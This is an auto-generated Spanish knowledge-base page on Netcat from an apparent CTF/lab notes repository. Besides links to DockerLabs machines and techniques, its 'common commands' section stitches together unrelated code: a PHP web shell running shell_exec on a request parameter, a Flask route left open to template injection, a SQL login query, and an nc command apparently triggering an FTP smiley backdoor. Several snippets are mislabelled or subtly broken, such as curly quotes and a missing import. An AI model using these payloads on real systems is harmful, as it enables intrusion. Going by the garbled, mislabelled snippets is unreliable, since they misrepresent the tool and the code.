<!-- AUTO-GENERATED: BanditBox knowledge base. Safe to overwrite. -->

---
title: Netcat
node_type: tool
---

# Netcat

## Proposito

Herramienta detectada dentro del repositorio BanditBox. TODO: ampliar proposito y limites de uso.

## Instalacion

TODO: documentar instalacion segura y sistema recomendado.

## Comandos comunes

```bash
SELECT * FROM usuarios WHERE usuario = 'tu usuario' AND password = 'tu contraseña';
```

```bash
<?php
echo "TESTING";
?>
```

```bash
from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/')
def hello():
    nombre = request.args.get('nombre', 'Invitado')
    plantilla = f"<h1>Hola, {nombre}!</h1>"  # PARTE VULNERABLE A SSTI
    return render_template_string(plantilla)
```

```bash
<?php
echo "<pre>" . shell_exec($_REQUEST["parametro__cualquiera"]) . "</pre>";
?>
```

```bash
printf “USER bandit:)\r\nPASS pass\r\n” | nc 172.17.0.2 && sleep 1 && nc 172.17.0.2 6200
```

## Uso dentro de este repositorio

- [Candy](../machines/dockerlabs/facil/candy.md)
- [FirstHacking](../machines/dockerlabs/muy-facil/firsthacking.md)
- [Internship](../machines/dockerlabs/facil/internship.md)
- [Tproot](../machines/dockerlabs/muy-facil/tproot.md)
- [Upload](../machines/dockerlabs/facil/upload.md)
- [Verdejo](../machines/dockerlabs/facil/verdejo.md)
- [Where Is My Web Shell](../machines/dockerlabs/facil/where-is-my-web-shell.md)

## Maquinas relacionadas

- [Candy](../machines/dockerlabs/facil/candy.md)
- [FirstHacking](../machines/dockerlabs/muy-facil/firsthacking.md)
- [Internship](../machines/dockerlabs/facil/internship.md)
- [Tproot](../machines/dockerlabs/muy-facil/tproot.md)
- [Upload](../machines/dockerlabs/facil/upload.md)
- [Verdejo](../machines/dockerlabs/facil/verdejo.md)
- [Where Is My Web Shell](../machines/dockerlabs/facil/where-is-my-web-shell.md)

## Tecnicas relacionadas

- [Brute force](../techniques/brute-force.md)
- [CMS exploitation](../techniques/cms-exploitation.md)
- [Connectivity check](../techniques/connectivity-check.md)
- [Credential extraction](../techniques/credential-extraction.md)
- [Hash cracking](../techniques/hash-cracking.md)
- [Login bypass](../techniques/login-bypass.md)
- [Malicious file upload](../techniques/malicious-file-upload.md)
- [Metadata analysis](../techniques/metadata-analysis.md)
- [Port enumeration](../techniques/port-enumeration.md)
- [Remote Code Execution](../techniques/rce.md)
- [SQL Injection](../techniques/sql-injection.md)
- [SSTI](../techniques/ssti.md)
- [Steganography](../techniques/steganography.md)
- [sudo abuse](../techniques/sudo-abuse.md)
- [SUID abuse](../techniques/suid-abuse.md)
- [TTY stabilization](../techniques/tty-stabilization.md)
- [Web enumeration](../techniques/web-enumeration.md)
